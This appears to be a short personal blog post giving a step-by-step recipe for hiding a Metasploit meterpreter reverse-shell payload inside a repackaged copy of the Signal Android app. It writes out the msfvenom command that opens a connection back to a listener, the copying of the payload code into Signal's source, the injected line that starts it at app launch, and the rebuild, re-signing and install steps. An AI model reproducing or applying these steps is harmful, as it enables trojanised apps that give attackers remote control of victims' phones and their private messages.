---
layout: post
title: Msfvenom Android APK
---

This post is just going to cover the unpackaging and recreating of official Android apps with Msfvenom payloads. I made this 
mainly as future notes for myself, but maybe this can help you too. Also, because the documentation that I was working from 
is now outdated.

Install the following apps:

	sudo apt install apktool apksigner adb zipalign keytool

Assuming you have msfvenom/metasploit installed, create the malicious APK:

	msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 R > meterpreter.apk

The options are pretty straightforward. The listener is TCP based versus the other HTTP or HTTPS options. And, the listener 
IP address to connect back is at 192.168.1.1 and the port is 4444. Once the APK is built, we can unpackage it.

	apktool decode -o meterpreter meterpreter.apk

	( -o <name> is the name of the folder where everything will be decoded to )
	( and, the apk is the target that will be decoded )

Do this for the meterpreter.apk as well as the official app that you want to repackage:

	apktool decode -o signal signal.apk

Copy the contents of the meterpreter smali folder to the official app:

	cp -r meterpreter/smali/com/metasploit signal/smali/com/.

	( this file structure is Android 11 specific )
	( against a Pixel 6 using arm64-v8a )

Next, we need to identify the beginning of the official APK. We need to find the <activity ... > that is used when the app 
is first launched. When comparing against Signal version 6.1.3, this should be the following file:

	nano signal/smali/org/thoughtcrime/securesms/ApplicationContext.smali

	( search for the following lines "onCreate()V" or "onCreate(Landroid...)V"

	( paste the following below ".line 131", as an example, verify for your own APK where to place )

	invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

Build the app into an APK and zipalign it:

	apktool build signal/ --use-aapt2

	zipalign -f -p 4 signal/dist/<CREATED_APK>.apk signal/dist/<OUTPUT_ALIGNED_APK>.apk

	( where the created apk is the one we just built, and the output aligned apk is the aligned version )

Let's generate the key used after rebuilding the APK:

	keytool -genkey -V -keystore key.keystore -alias hacked -keyalg RSA -keysize 2048 -validity 10000

And, we can now sign the newly created and aligned APK:

	apksigner sign --ks key.keystore --ks-pass pass:password signal/dist/<OUTPUT_ALIGNED_APK>.apk

This should properly keep the APK aligned and now signed as well. The last thing to do is pair your Android device and 
authenticate the ADB connection. The app can then be pushed with the following command:

	adb install signal/dist/<OUTPUT_ALIGNED_APK>.apk

Start the metasploit listener on the host. Once it is ready, launch the app from the compromised device and it should 
connect immediately. If there are delays or issues getting the device to spawn a msf session, check your routing from the 
compromised device.
